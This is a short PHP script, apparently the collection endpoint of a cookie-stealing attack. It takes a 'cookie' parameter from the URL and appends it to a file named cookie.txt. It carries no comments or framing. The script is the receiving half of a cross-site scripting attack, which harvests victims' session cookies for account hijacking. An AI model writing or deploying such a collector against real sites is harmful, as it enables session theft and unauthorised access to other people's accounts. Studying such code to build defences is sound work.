<?php 
$cookieVar = $_GET["cookie"]; echo file_put_contents("cookie.txt", "\n\n", FILE_APPEND); echo file_put_contents("cookie.txt", $cookieVar, FILE_APPEND); ?> 


